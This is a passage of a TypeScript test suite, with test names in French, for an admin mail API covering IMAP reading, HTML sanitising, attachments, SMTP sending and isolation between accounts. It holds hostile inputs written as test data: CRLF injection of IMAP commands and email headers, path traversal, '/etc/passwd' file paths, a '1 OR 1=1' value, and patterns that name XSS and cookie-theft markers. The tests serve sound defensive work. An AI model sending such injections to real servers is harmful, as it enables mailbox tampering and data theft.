    const res = await browser.get<MailMessageSummary[]>(`/api/mail/accounts/${supportId}/messages?search=${encodeURIComponent('  facture ')}`);
    expect(res.status).toBe(200);
    expect(res.body.data.map((message) => message.uid)).toEqual([11]);
    expect(res.body.meta).toEqual({ page: 1, pageSize: 25, total: 1 });
    expect(opsOf('search')[0]!.args).toEqual([{ or: [{ subject: 'facture' }, { from: 'facture' }, { body: 'facture' }] }, { uid: true }]);

    for (const bad of [`search=${'a'.repeat(101)}`, `search=${encodeURIComponent(`x${CRLF}A9 LOGOUT`)}`, 'pageSize=101', 'page=0', `folder=${encodeURIComponent(`INBOX${CRLF}A9 DELETE INBOX`)}`, `folder=${'x'.repeat(256)}`]) {
      const refused = await browser.get(`/api/mail/accounts/${supportId}/messages?${bad}`);
      expect(refused.status, bad).toBe(400);
    }
    expect(opsOf('search')).toHaveLength(1);
  });

  it('un dossier inexistant donne 404, un compte inexistant aussi, sans fuite de connexion', async () => {
    const folder = await browser.get(`/api/mail/accounts/${supportId}/messages?folder=Inexistant`);
    expect(folder.status).toBe(404);
    expect(folder.body.error?.message).toBe('Dossier introuvable');
    assertNoLeak();
    const account = await browser.get('/api/mail/accounts/99999/messages');
    expect(account.status).toBe(404);
    for (const bad of ['0', 'abc', '1e2', '-1', '1%20OR%201=1']) expect((await browser.get(`/api/mail/accounts/${bad}/messages`)).status).toBe(400);
  });

  it('renvoie le détail d’un message avec un HTML assaini, sans le marquer lu', async () => {
    mock.whmcs.byEmail.set('client@exemple.test', { id: 42, name: 'Martin', email: 'client@exemple.test', companyName: null, status: 'Active' });
    const res = await browser.get<MailMessageDetail>(`/api/mail/accounts/${supportId}/messages/11`);
    expect(res.status).toBe(200);
    const message = res.body.data;

    expect(message).toMatchObject({
      uid: 11,
      folder: 'INBOX',
      from: { name: 'Client Martin', address: 'client@exemple.test' },
      to: [{ name: null, address: 'support@exemple.test' }],
      cc: [{ name: null, address: 'compta@exemple.test' }],
      replyTo: [{ name: null, address: 'reponse@exemple.test' }],
      subject: 'Facture en attente Bcc: intrus@evil.test',
      date: '2026-02-20T07:59:00.000Z',
      messageId: '<orig-1@client.test>',
      seen: false,
      hasAttachments: true,
      text: 'Bonjour, version texte.',
      remoteContentBlocked: true,
      whmcsClient: { id: 42, name: 'Martin', email: 'client@exemple.test', companyName: null, status: 'Active' },
    });
    expect(message.attachments).toEqual([{ id: '2', filename: 'facture _été_.pdf', contentType: 'application/pdf', size: 30 }]);

    const html = message.html!;
    expect(html).toContain('Bonjour');
    expect(html).toContain(`src="data:image/png;base64,${PNG.toString('base64')}"`);
    expect(html).toContain('<a href="https://exemple.test/facture" target="_blank" rel="noopener noreferrer nofollow">facture</a>');
    expect(html).toContain('<a>piège</a>');
    expect(html).toContain('data-remote-blocked="1"');
    expect(html).not.toMatch(/<script|<style|<iframe|<form|<input|<base|<svg|<title|<head|<body|<html/i);
    expect(html).not.toMatch(/onclick|onload|javascript:|tracker\.test|evil\.test|document\.cookie|steal\(|position/i);
    expect(html).not.toContain('cid:');

    // Lecture seule, source bornée, aucun indicateur modifié.
    expect(opsOf('lock')[0]!.args).toEqual(['INBOX', { readOnly: true, acquireTimeout: 10_000 }]);
    const query = opsOf('fetchOne')[0]!.args[1] as { source: { maxLength: number } };
    expect(query.source).toEqual({ start: 0, maxLength: 10 * 1024 * 1024 });
    expect(opsOf('flagsAdd')).toHaveLength(0);
    expect(mock.servers.get('imap.support.test')!.boxes.get('INBOX')![1]!.flags.has('\\Seen')).toBe(false);
    expect(mock.whmcs.calls).toEqual(['client@exemple.test']);
    assertNoLeak();
  });

  it('WHMCS en panne ou expéditeur invalide : la fiche client vaut null, le message s’affiche', async () => {
    mock.whmcs.fail = true;
    const down = await browser.get<MailMessageDetail>(`/api/mail/accounts/${supportId}/messages/12`);
    expect(down.status).toBe(200);
    expect(down.body.data.whmcsClient).toBeNull();
    expect(down.body.data.html).toBeNull();
    expect(down.body.data.text).toBe('Bonjour, proposez-vous des serveurs dédiés ?');

    mock.whmcs.fail = false;
    mock.whmcs.calls.length = 0;
    const box = mock.servers.get('imap.support.test')!.boxes.get('INBOX')!;
    box[2]!.envelope.from = [{ name: 'X', address: `x@exemple.test${CRLF}Bcc: y@z.test` }];
    const hostile = await browser.get<MailMessageDetail>(`/api/mail/accounts/${supportId}/messages/12`);
    expect(hostile.body.data.whmcsClient).toBeNull();
    expect(mock.whmcs.calls).toEqual([]);
  });

  it('message introuvable → 404 ; uid invalide → 400', async () => {
    expect((await browser.get(`/api/mail/accounts/${supportId}/messages/999`)).status).toBe(404);
    for (const bad of ['0', 'abc', '1:*', '4294967296']) expect((await browser.get(`/api/mail/accounts/${supportId}/messages/${encodeURIComponent(bad)}`)).status).toBe(400);
    assertNoLeak();
  });

  it('télécharge une pièce jointe en téléchargement forcé, type neutre', async () => {
    const res = await browser.get(`/api/mail/accounts/${supportId}/messages/11/attachments/2`);
    expect(res.status).toBe(200);
    expect(res.raw.rawPayload.equals(PDF)).toBe(true);
    expect(res.raw.headers['content-type']).toBe('application/octet-stream');
    expect(res.raw.headers['content-disposition']).toBe(`attachment; filename="facture _été_.pdf"; filename*=UTF-8''facture%20_%C3%A9t%C3%A9_.pdf`.replace(/[^\x20-\x7e](?=[^"]*"; filename\*)/g, '_'));
    expect(res.raw.headers['x-content-type-options']).toBe('nosniff');
    expect(res.raw.headers['content-security-policy']).toBe("default-src 'none'; sandbox");
    expect(res.raw.headers['cache-control']).toBe('no-store');
    expect(Number(res.raw.headers['content-length'])).toBe(PDF.length);
    expect(opsOf('lock')[0]!.args[1]).toMatchObject({ readOnly: true });
    expect(opsOf('download')[0]!.args).toEqual([11, '2', { uid: true, maxBytes: 25 * 1024 * 1024 + 1 }]);
    assertNoLeak();
  });

  it('une image intégrée reste téléchargeable, toujours en octet-stream', async () => {
    const res = await browser.get(`/api/mail/accounts/${supportId}/messages/11/attachments/1.2.2`);
    expect(res.status).toBe(200);
    expect(res.raw.headers['content-type']).toBe('application/octet-stream');
    expect(String(res.raw.headers['content-disposition'])).toMatch(/^attachment; filename="logo\.png"/);
  });

  it('refuse un identifiant de pièce jointe invalide, inconnu ou trop volumineux', async () => {
    for (const bad of ['TEXT', '1.MIME', 'HEADER', '0', '..%2F1', '1%5D%3C0%3E']) {
      expect((await browser.get(`/api/mail/accounts/${supportId}/messages/11/attachments/${bad}`)).status, bad).toBe(400);
    }
    expect(mock.instances).toHaveLength(0);
    expect((await browser.get(`/api/mail/accounts/${supportId}/messages/11/attachments/7`)).status).toBe(404);
    expect((await browser.get(`/api/mail/accounts/${supportId}/messages/999/attachments/2`)).status).toBe(404);
    // Un multipart n'est pas une partie téléchargeable.
    expect((await browser.get(`/api/mail/accounts/${supportId}/messages/11/attachments/1`)).status).toBe(404);
    expect(opsOf('download')).toHaveLength(0);

    const box = mock.servers.get('imap.support.test')!.boxes.get('INBOX')!;
    const structure = box[1]!.bodyStructure as { childNodes: { size?: number }[] };
    structure.childNodes[1]!.size = 60 * 1024 * 1024;
    const big = await browser.get(`/api/mail/accounts/${supportId}/messages/11/attachments/2`);
    expect(big.status).toBe(400);
    expect(opsOf('download')).toHaveLength(0);
    assertNoLeak();
  });
});

// ───────────────────────────── Actions ─────────────────────────────

describe('indicateurs, déplacement, suppression', () => {
  it('modifie les indicateurs lu / suivi', async () => {
    const seen = await browser.post(`/api/mail/accounts/${supportId}/messages/12/flags`, { seen: true, flagged: true });
    expect(seen.status).toBe(200);
    expect(seen.body.data).toEqual({ uid: 12, folder: 'INBOX', seen: true, flagged: true, answered: false });
    expect(opsOf('lock')[0]!.args[1]).toMatchObject({ readOnly: false });
    expect(opsOf('flagsAdd')[0]!.args).toEqual([12, ['\\Seen', '\\Flagged'], { uid: true }]);

    const box = mock.servers.get('imap.support.test')!.boxes.get('INBOX')!;
    box[2]!.flags = new Set(['\\Seen', '\\Flagged']);
    const unseen = await browser.post(`/api/mail/accounts/${supportId}/messages/12/flags`, { seen: false });
    expect(unseen.body.data).toEqual({ uid: 12, folder: 'INBOX', seen: false, flagged: true, answered: false });
    expect(opsOf('flagsRemove')[0]!.args).toEqual([12, ['\\Seen'], { uid: true }]);

    expect((await browser.post(`/api/mail/accounts/${supportId}/messages/12/flags`, {})).status).toBe(400);
    expect((await browser.post(`/api/mail/accounts/${supportId}/messages/12/flags`, { seen: true, deleted: true })).status).toBe(400);
    expect((await browser.post(`/api/mail/accounts/${supportId}/messages/999/flags`, { seen: true })).status).toBe(404);
    assertNoLeak();
  });

  it('déplace un message et le journalise', async () => {
    const res = await browser.post(`/api/mail/accounts/${supportId}/messages/12/move`, { destination: 'Clients' });
    expect(res.status).toBe(200);
    const server = mock.servers.get('imap.support.test')!;
    expect(server.boxes.get('Clients')!.map((m) => m.uid)).toEqual([12]);
    expect(server.boxes.get('INBOX')!.map((m) => m.uid)).toEqual([10, 11]);
    const entry = lastAudit('mail.message.move');
    expect(entry).toMatchObject({ success: 1, target: `compte mail #${supportId} (Support) · INBOX · message 12`, user_id: alice.user.id });
    expect(JSON.parse(entry.details!)).toEqual({ destination: 'Clients' });
    assertNoLeak();
  });

  it('refuse un déplacement invalide et journalise l’échec', async () => {
    expect((await browser.post(`/api/mail/accounts/${supportId}/messages/12/move`, { destination: `Clients${CRLF}A9 DELETE INBOX` })).status).toBe(400);
    expect((await browser.post(`/api/mail/accounts/${supportId}/messages/12/move`, { destination: '' })).status).toBe(400);
    expect((await browser.post(`/api/mail/accounts/${supportId}/messages/12/move`, { destination: 'INBOX' })).status).toBe(400);
    expect(opsOf('move')).toHaveLength(0);

    const missing = await browser.post(`/api/mail/accounts/${supportId}/messages/12/move`, { destination: 'Inexistant' });
    expect(missing.status).toBe(502);
    expect(missing.body.error?.message).not.toMatch(/NO|TRYCREATE/);
    expect(lastAudit('mail.message.move')).toMatchObject({ success: 0 });
    expect((await browser.post(`/api/mail/accounts/${supportId}/messages/999/move`, { destination: 'Clients' })).status).toBe(404);
    expect(mock.servers.get('imap.support.test')!.boxes.get('INBOX')!).toHaveLength(3);
    assertNoLeak();
  });

  it('supprime vers la corbeille si elle existe, définitivement depuis la corbeille', async () => {
    const res = await browser.delete(`/api/mail/accounts/${supportId}/messages/12`);
    expect(res.status).toBe(200);
    expect(res.body.data).toEqual({ deleted: true, movedToTrash: true });
    const server = mock.servers.get('imap.support.test')!;
    expect(server.boxes.get('Corbeille')!.map((m) => m.uid)).toEqual([12]);
    expect(opsOf('delete')).toHaveLength(0);
    expect(JSON.parse(lastAudit('mail.message.delete').details!)).toEqual({ movedToTrash: true });

    const purge = await browser.delete(`/api/mail/accounts/${supportId}/messages/12?folder=Corbeille`);
    expect(purge.body.data).toEqual({ deleted: true, movedToTrash: false });
    expect(server.boxes.get('Corbeille')).toEqual([]);
    expect(opsOf('delete')[0]!.args).toEqual([12, { uid: true }]);
    expect(lastAudit('mail.message.delete')).toMatchObject({ success: 1, target: `compte mail #${supportId} (Support) · Corbeille · message 12` });
    assertNoLeak();
  });

  it('sans corbeille, la suppression est définitive', async () => {
    const res = await browser.delete(`/api/mail/accounts/${billingId}/messages/501`);
    expect(res.body.data).toEqual({ deleted: true, movedToTrash: false });
    expect(mock.servers.get('imap.billing.test')!.boxes.get('INBOX')).toEqual([]);
    expect((await browser.delete(`/api/mail/accounts/${billingId}/messages/501`)).status).toBe(404);
    expect(lastAudit('mail.message.delete')).toMatchObject({ success: 0 });
  });
});

// ───────────────────────────── Envoi ─────────────────────────────

describe('envoi', () => {
  const basic = { to: ['client@exemple.test'], subject: 'Votre demande', text: 'Bonjour,\n\nVoici notre réponse.' };

  it('envoie avec l’expéditeur du compte, TLS exigé, et copie dans « Envoyés »', async () => {
    const res = await browser.post<MailSendResult>(`/api/mail/accounts/${supportId}/send`, { ...basic, cc: ['copie@exemple.test'], bcc: ['cachee@exemple.test'] });
    expect(res.status).toBe(200);
    expect(res.body.data.messageId).toMatch(/^<[0-9a-f-]{36}@exemple\.test>$/);
    expect(Object.keys(res.body.data)).toEqual(['messageId']);

    expect(mock.smtp.sent).toHaveLength(1);
    const { options, message } = mock.smtp.sent[0]!;
    expect(options).toMatchObject({ host: 'smtp.support.test', port: 587, secure: false, requireTLS: true, disableFileAccess: true, disableUrlAccess: true });
    expect(options.tls).toEqual({ rejectUnauthorized: true, minVersion: 'TLSv1.2' });
    expect(options.auth).toEqual({ user: 'support-login', pass: supportInput.password });
    expect(message.from).toEqual({ name: 'Support', address: 'support@exemple.test' });
    expect(message.envelope).toEqual({ from: 'support@exemple.test', to: ['client@exemple.test', 'copie@exemple.test', 'cachee@exemple.test'] });
    expect(message).toMatchObject({ subject: 'Votre demande', text: basic.text, disableFileAccess: true, disableUrlAccess: true });
    expect(message.html).toBeUndefined();
    expect(message.inReplyTo).toBeUndefined();

    const server = mock.servers.get('imap.support.test')!;
    expect(server.appended).toHaveLength(1);
    expect(server.appended[0]).toMatchObject({ path: 'Envoyés', flags: ['\\Seen'] });
    const copy = await simpleParser(server.appended[0]!.content);
    expect(copy.messageId).toBe(res.body.data.messageId);
    expect(copy.from?.value).toEqual([{ address: 'support@exemple.test', name: 'Support' }]);
    expect(copy.text?.trim()).toBe(basic.text);
    expect(copy.bcc && !Array.isArray(copy.bcc) ? copy.bcc.value.map((a) => a.address) : null).toEqual(['cachee@exemple.test']);

    // Journal : ni objet, ni texte, ni destinataires, ni mot de passe.
    const entry = lastAudit('mail.message.send');
    expect(entry).toMatchObject({ success: 1, target: `compte mail #${supportId} (Support)`, user_id: alice.user.id });
    expect(JSON.parse(entry.details!)).toEqual({ recipients: 3, attachments: 0, reply: false, messageId: res.body.data.messageId, rejected: 0, savedToSent: true, markedAnswered: false });
    expect(entry.details).not.toMatch(/Votre demande|Voici notre|client@exemple|mdp-/);
    assertNoLeak();
  });

  it('l’expéditeur ne peut pas être fourni par le client', async () => {
    for (const patch of [{ from: 'pdg@exemple.test' }, { sender: 'pdg@exemple.test' }, { envelope: { from: 'pdg@exemple.test' } }, { headers: { From: 'pdg@exemple.test' } }, { replyTo: 'x@exemple.test' }, { html: '<b>x</b>' }]) {
      const res = await browser.post(`/api/mail/accounts/${supportId}/send`, { ...basic, ...patch });
      expect(res.status, JSON.stringify(patch)).toBe(400);
    }
    expect(mock.smtp.sent).toHaveLength(0);
    expect(mock.smtp.transports).toHaveLength(0);
  });

  it('refuse l’injection d’en-têtes par l’objet ou les adresses', async () => {
    const cases: Record<string, unknown>[] = [
      { subject: `Objet${CRLF}Bcc: victime@exemple.test` },
      { subject: 'Objet\nX-Injecte: 1' },
      { subject: 'Objet\rX-Injecte: 1' },
      { to: [`client@exemple.test${CRLF}Bcc: victime@exemple.test`] },
      { to: ['client@exemple.test\nBcc: victime@exemple.test'] },
      { to: ['Client <client@exemple.test>'] },
      { to: ['a@exemple.test, b@exemple.test'] },
      { cc: ['copie@exemple.test\r\nSubject: autre'] },
      { bcc: ['x@exemple.test\n'] },
      { to: [] },
      { to: Array.from({ length: 51 }, (_v, i) => `d${i}@exemple.test`) },
      { text: { path: '/etc/passwd' } },
      { attachments: [{ filename: 'a.txt', contentType: 'text/plain', path: '/etc/passwd' }] },
      { attachments: [{ filename: 'a.txt', contentType: 'text/plain', contentBase64: 'pas-du-base64!' }] },
    ];
    for (const patch of cases) {
      const res = await browser.post(`/api/mail/accounts/${supportId}/send`, { ...basic, ...patch });
      expect(res.status, JSON.stringify(patch)).toBe(400);
      expect(res.errorCode).toBe('VALIDATION_ERROR');
    }
    expect(mock.smtp.sent).toHaveLength(0);
    expect(mock.instances).toHaveLength(0);
  });

  it('une réponse reprend le fil (In-Reply-To / References) et marque l’original « répondu »', async () => {
    const res = await browser.post<MailSendResult>(`/api/mail/accounts/${supportId}/send`, { ...basic, subject: 'Re: Facture en attente', inReplyTo: { folder: 'INBOX', uid: 11 } });
    expect(res.status).toBe(200);
    const { message } = mock.smtp.sent[0]!;
    expect(message.inReplyTo).toBe('<orig-1@client.test>');
    expect(message.references).toEqual(['<r1@client.test>', '<r2@client.test>', '<orig-1@client.test>']);

    const server = mock.servers.get('imap.support.test')!;
    expect(server.boxes.get('INBOX')![1]!.flags.has('\\Answered')).toBe(true);
    const copy = await simpleParser(server.appended[0]!.content);
    expect(copy.inReplyTo).toBe('<orig-1@client.test>');
    expect(JSON.parse(lastAudit('mail.message.send').details!)).toMatchObject({ reply: true, savedToSent: true, markedAnswered: true });
    // Le contexte de réponse est lu en lecture seule ; seul le marquage ouvre la boîte en écriture.
    expect(opsOf('lock').map((call) => (call.args[1] as { readOnly: boolean }).readOnly)).toEqual([true, false]);
    assertNoLeak();
  });

  it('un Message-ID d’origine piégé n’est jamais recopié dans les en-têtes', async () => {
    const box = mock.servers.get('imap.support.test')!.boxes.get('INBOX')!;
    box[1]!.envelope.messageId = `<x@y>${CRLF}Bcc: victime@exemple.test`;
    box[1]!.headers = `References: <ok@x> <mauvais${CRLF}Bcc: victime@exemple.test>${CRLF}${CRLF}`;
    const res = await browser.post<MailSendResult>(`/api/mail/accounts/${supportId}/send`, { ...basic, inReplyTo: { folder: 'INBOX', uid: 11 } });
    expect(res.status).toBe(200);
    const { message } = mock.smtp.sent[0]!;
    expect(message.inReplyTo).toBeUndefined();
    expect(message.references).toBeUndefined();
    const raw = mock.servers.get('imap.support.test')!.appended[0]!.content.toString('utf8');
    expect(raw).not.toContain('victime@exemple.test');
  });

  it('répondre à un message inexistant échoue sans rien envoyer', async () => {
    const res = await browser.post(`/api/mail/accounts/${supportId}/send`, { ...basic, inReplyTo: { folder: 'INBOX', uid: 999 } });
    expect(res.status).toBe(404);
    expect(mock.smtp.sent).toHaveLength(0);
    expect(lastAudit('mail.message.send')).toMatchObject({ success: 0 });
    assertNoLeak();
  });

  it('accepte des pièces jointes (noms assainis) au-delà de la limite de corps globale', async () => {
    const big = Buffer.alloc(3 * 1024 * 1024, 7);
    const res = await browser.post<MailSendResult>(`/api/mail/accounts/${supportId}/send`, {
      ...basic,
      attachments: [
        { filename: '../../devis "final".pdf', contentType: 'application/pdf', contentBase64: big.toString('base64') },
        { filename: '..', contentType: 'n’importe quoi', contentBase64: Buffer.from('abc').toString('base64') },
      ],
    });
    expect(res.status).toBe(200);
    const attachments = mock.smtp.sent[0]!.message.attachments as { filename: string; content: Buffer; contentType: string; contentDisposition: string; path?: string; href?: string }[];
    expect(attachments.map((a) => [a.filename, a.contentType, a.contentDisposition, a.content.length])).toEqual([
      ['devis _final_.pdf', 'application/pdf', 'attachment', big.length],
      ['piece-jointe-2', 'application/octet-stream', 'attachment', 3],
    ]);
    expect(attachments.every((a) => a.path === undefined && a.href === undefined)).toBe(true);
    expect(JSON.parse(lastAudit('mail.message.send').details!)).toMatchObject({ attachments: 2 });

    // La limite relevée ne vaut que pour l'envoi : ailleurs, 1 Mo.
    const elsewhere = await browser.post(`/api/mail/accounts/${supportId}/messages/12/flags`, { seen: true, padding: 'x'.repeat(2 * 1024 * 1024) });
    expect(elsewhere.status).toBe(413);
  });

  it('plafonne la taille totale des pièces jointes à 10 Mo', async () => {
    const chunk = Buffer.alloc(5 * 1024 * 1024 + 1024).toString('base64');
    const res = await browser.post(`/api/mail/accounts/${supportId}/send`, {
      ...basic,
      attachments: [
        { filename: 'a.bin', contentType: 'application/octet-stream', contentBase64: chunk },
        { filename: 'b.bin', contentType: 'application/octet-stream', contentBase64: chunk },
      ],
    });
    expect(res.status).toBe(400);
    expect(mock.smtp.sent).toHaveLength(0);
  });

  it('un échec SMTP donne une erreur sobre et est journalisé, sans copie dans « Envoyés »', async () => {
    mock.smtp.sendError = Object.assign(new Error(`550 5.7.1 <client@exemple.test>: Relay access denied for support-login / ${supportInput.password}`), {
      code: 'EENVELOPE',
      response: `550 5.7.1 Relay access denied ${supportInput.password}`,
    });
    const res = await browser.post(`/api/mail/accounts/${supportId}/send`, basic);
    expect(res.status).toBe(502);
    expect(res.errorCode).toBe('UPSTREAM_ERROR');
    expect(res.body.error?.details).toEqual({ integration: 'mail', reason: 'rejected' });
    const raw = JSON.stringify(res.body);
    expect(raw).not.toContain(supportInput.password);
    expect(raw).not.toMatch(/550|Relay|support-login|smtp\.support\.test/);
    expect(mock.servers.get('imap.support.test')!.appended).toHaveLength(0);
    const entry = lastAudit('mail.message.send');
    expect(entry.success).toBe(0);
    expect(JSON.parse(entry.details!)).toMatchObject({ error: 'UPSTREAM_ERROR', reason: 'rejected' });
    expect(entry.details).not.toContain(supportInput.password);
    assertNoLeak();
  });

  it('l’envoi réussit même si la copie « Envoyés » échoue', async () => {
    const res = await browser.post<MailSendResult>(`/api/mail/accounts/${billingId}/send`, basic);
    expect(res.status).toBe(200);
    expect(mock.smtp.sent[0]!.message.from).toEqual({ name: 'Facturation', address: 'facturation@exemple.test' });
    // Ce compte n'a pas de dossier « Envoyés » : rien n'est créé d'office.
    expect(mock.servers.get('imap.billing.test')!.appended).toHaveLength(0);
    expect(JSON.parse(lastAudit('mail.message.send').details!)).toMatchObject({ savedToSent: false });
    assertNoLeak();
  });

  it('limite le débit d’envoi par administrateur', async () => {
    const other = new Browser(app, uniqueIp());
    await other.login(bob);
    for (let i = 0; i < 20; i += 1) {
      const ok = await other.post(`/api/mail/accounts/${supportId}/send`, basic);
      expect(ok.status, `envoi ${i + 1}`).toBe(200);
    }
    const limited = await other.post(`/api/mail/accounts/${supportId}/send`, basic);
    expect(limited.status).toBe(429);
    expect(limited.errorCode).toBe('RATE_LIMITED');
    expect(Number(limited.raw.headers['retry-after'])).toBeGreaterThan(0);
    expect(mock.smtp.sent).toHaveLength(20);
    expect(lastAudit('mail.message.send')).toMatchObject({ success: 0, user_id: bob.user.id });
    // La limite est propre à chaque administrateur…
    expect((await browser.post(`/api/mail/accounts/${supportId}/send`, basic)).status).toBe(200);
    // … et la fenêtre glisse.
    advance(10 * 60_000 + 1_000);
    expect((await other.post(`/api/mail/accounts/${supportId}/send`, basic)).status).toBe(200);
  });
});

// ───────────────────────────── Non-lus, isolation, robustesse ─────────────────────────────

describe('résumé des non-lus', () => {
  it('additionne les comptes ; un compte en erreur n’empêche pas les autres', async () => {
    const all = await browser.get<MailUnreadSummary>('/api/mail/unread-summary');
    expect(all.status).toBe(200);
    expect(all.body.data).toEqual({
      total: 3,
      accounts: [
        { accountId: supportId, label: 'Support', address: 'support@exemple.test', unread: 2, error: null },
        { accountId: billingId, label: 'Facturation', address: 'facturation@exemple.test', unread: 1, error: null },
      ],
    });
    assertNoLeak();

    advance(31_000);
    mock.servers.get('imap.billing.test')!.connectError = Object.assign(new Error(`connect ECONNREFUSED 203.0.113.9:143 (${billingInput.password})`), { code: 'ECONNREFUSED' });
    const partial = await browser.get<MailUnreadSummary>('/api/mail/unread-summary');
    expect(partial.status).toBe(200);
    expect(partial.body.data.total).toBe(2);
    expect(partial.body.data.accounts[0]).toMatchObject({ accountId: supportId, unread: 2, error: null });
    expect(partial.body.data.accounts[1]).toEqual({ accountId: billingId, label: 'Facturation', address: 'facturation@exemple.test', unread: 0, error: 'Serveur de messagerie injoignable' });
    expect(JSON.stringify(partial.body)).not.toMatch(/ECONNREFUSED|203\.0\.113\.9|mdp-/);
    assertNoLeak();
  });

  it('met le résultat en cache quelques secondes et l’invalide après une action', async () => {
    await browser.get('/api/mail/unread-summary');
    const connections = mock.instances.length;
    expect(connections).toBe(2);
    await browser.get('/api/mail/unread-summary');
    expect(mock.instances.length).toBe(connections);

    await browser.post(`/api/mail/accounts/${supportId}/messages/12/flags`, { seen: true });
    const after = await browser.get<MailUnreadSummary>('/api/mail/unread-summary');
    expect(after.body.data.accounts[0]).toMatchObject({ accountId: supportId, unread: 1 });
    expect(after.body.data.total).toBe(2);

    advance(31_000);
    const before = mock.instances.length;
    await browser.get('/api/mail/unread-summary');
    expect(mock.instances.length).toBe(before + 2);
  });

  it('ne prolonge pas la session (interrogation périodique)', async () => {
    const idle = new Browser(app, uniqueIp());
    await idle.login(bob);
    advance(10 * 60_000);
    expect((await idle.get('/api/mail/unread-summary')).status).toBe(200);
    // La session principale des tests, elle, reste active (requête ordinaire).
    expect((await browser.get('/api/mail/accounts')).status).toBe(200);
    advance(6 * 60_000);
    // 16 minutes sans activité réelle : la session a expiré malgré l'interrogation intermédiaire.
    expect((await idle.get('/api/mail/accounts')).status).toBe(401);
  });
});

describe('isolation entre comptes', () => {
  it('l’identifiant de l’URL détermine seul la boîte, les identifiants et le serveur', async () => {
    await browser.get(`/api/mail/accounts/${billingId}/messages`);
    await browser.get(`/api/mail/accounts/${billingId}/messages/501`);
    await browser.post(`/api/mail/accounts/${billingId}/messages/501/flags`, { seen: true });
    expect(mock.calls.length).toBeGreaterThan(5);
    expect(new Set(mock.calls.map((call) => `${call.host}|${call.user}`))).toEqual(new Set(['imap.billing.test|billing-login']));
    for (const instance of mock.instances) expect(instance.options.auth).toEqual({ user: 'billing-login', pass: billingInput.password });

    mock.calls.length = 0;
    mock.instances.length = 0;
    const support = await browser.get<MailMessageSummary[]>(`/api/mail/accounts/${supportId}/messages`);
    expect(new Set(mock.calls.map((call) => `${call.host}|${call.user}`))).toEqual(new Set(['imap.support.test|support-login']));
    expect(JSON.stringify(support.body)).not.toContain('Relevé bancaire');
  });

  it('un message d’un compte n’est pas atteignable par l’autre', async () => {
    expect((await browser.get(`/api/mail/accounts/${supportId}/messages/501`)).status).toBe(404);
    expect((await browser.get(`/api/mail/accounts/${billingId}/messages/11`)).status).toBe(404);
    expect((await browser.get(`/api/mail/accounts/${billingId}/messages/11/attachments/2`)).status).toBe(404);
    expect((await browser.post(`/api/mail/accounts/${billingId}/messages/11/move`, { destination: 'INBOX2' })).status).toBe(404);
    expect((await browser.delete(`/api/mail/accounts/${billingId}/messages/11`)).status).toBe(404);
    expect(mock.servers.get('imap.support.test')!.boxes.get('INBOX')!.map((m) => m.uid)).toEqual([10, 11, 12]);
    // Aucun paramètre ne permet de désigner un autre compte que celui de l'URL.
    const res = await browser.get<MailMessageSummary[]>(`/api/mail/accounts/${billingId}/messages?id=${supportId}&accountId=${supportId}`);
    expect(res.body.data.map((message) => message.uid)).toEqual([501]);
    const sent = await browser.post(`/api/mail/accounts/${billingId}/send`, { to: ['x@exemple.test'], subject: 's', text: 't', accountId: supportId });
    expect(sent.status).toBe(400);
  });

  it('un mot de passe ne sert que pour son compte', async () => {
    // Le chiffré du compte « Support » recopié sur « Facturation » ne se déchiffre pas : aucune connexion n'est tentée.
    const original = passwordEnc(billingId);
    db.prepare('UPDATE mail_accounts SET password_enc = ? WHERE id = ?').run(passwordEnc(supportId), billingId);
    try {
      const res = await browser.get(`/api/mail/accounts/${billingId}/folders`);
      expect(res.status).toBe(502);
      expect(mock.calls).toHaveLength(0);
      expect(JSON.stringify(res.body)).not.toMatch(/mdp-|v1:/);
    } finally {
      db.prepare('UPDATE mail_accounts SET password_enc = ? WHERE id = ?').run(original, billingId);
    }
  });
});

describe('robustesse', () => {
  it('une erreur en cours d’opération ferme la connexion et libère le verrou', async () => {
    const proto = mock.FakeImapFlow.prototype as unknown as { fetchAll: (...args: unknown[]) => Promise<unknown[]> };
    const original = proto.fetchAll;
    proto.fetchAll = async () => {
      throw Object.assign(new Error(`A5 BAD internal error ${supportInput.password}`), { responseText: 'BAD parse error', code: 'InvalidResponse' });
    };
    try {
      const res = await browser.get(`/api/mail/accounts/${supportId}/messages`);
      expect(res.status).toBe(502);
      expect(res.body.error).toEqual({ code: 'UPSTREAM_ERROR', message: 'Le serveur de messagerie a renvoyé une erreur', details: { integration: 'mail', reason: 'unknown' } });
    } finally {
      proto.fetchAll = original;
    }
    expect(mock.instances).toHaveLength(1);
    assertNoLeak();
  });

  it('un échec de connexion ne laisse aucune connexion ouverte et ne révèle rien', async () => {
    mock.servers.get('imap.support.test')!.connectError = Object.assign(new Error('self-signed certificate; host imap.support.test'), { code: 'DEPTH_ZERO_SELF_SIGNED_CERT' });
    const res = await browser.get(`/api/mail/accounts/${supportId}/messages/11`);
    expect(res.status).toBe(502);
    expect(res.body.error?.details).toEqual({ integration: 'mail', reason: 'tls' });
    expect(JSON.stringify(res.body)).not.toMatch(/self-signed|imap\.support\.test/);
    assertNoLeak();

    mock.servers.delete('imap.support.test');
    const unknown = await browser.get(`/api/mail/accounts/${supportId}/folders`);
    expect(unknown.body.error?.details).toEqual({ integration: 'mail', reason: 'network' });
    expect(JSON.stringify(unknown.body)).not.toMatch(/ENOTFOUND|getaddrinfo|imap\.support\.test/);
    assertNoLeak();
  });

  it('supprimer un compte exige un step-up, est journalisé et rend le compte inaccessible', async () => {
    await stepUp();
    const res = await browser.delete(`/api/mail/accounts/${billingId}`);
    expect(res.status).toBe(200);
    expect(lastAudit('mail.account.delete')).toMatchObject({ success: 1, target: `compte mail #${billingId} (Facturation)` });
    expect(db.prepare('SELECT COUNT(*) AS n FROM mail_accounts WHERE id = ?').get(billingId)).toEqual({ n: 0 });
    expect((await browser.get(`/api/mail/accounts/${billingId}/messages`)).status).toBe(404);
    expect((await browser.delete(`/api/mail/accounts/${billingId}`)).status).toBe(404);
    const summary = await browser.get<MailUnreadSummary>('/api/mail/unread-summary');
    expect(summary.body.data.accounts.map((account) => account.accountId)).toEqual([supportId]);
    expect(mock.calls.every((call) => call.host === 'imap.support.test')).toBe(true);
  });
});

// ───────────────────────────── Boîtes personnelles ─────────────────────────────

describe('boîtes personnelles et partagées', () => {
  const PERSONAL_ADDRESS = 'alice.perso@exemple.test';
  const personalInput = {
    label: 'Perso Alice',
    address: PERSONAL_ADDRESS,
    imapHost: 'imap.alice.test',
    imapPort: 993,
    imapSecure: true,
    smtpHost: 'smtp.alice.test',
    smtpPort: 465,
    smtpSecure: true,
    username: 'alice-login',
    password: 'mdp-Alice-Perso-3',
    visibility: 'personal',
  };
  let personalId: number;
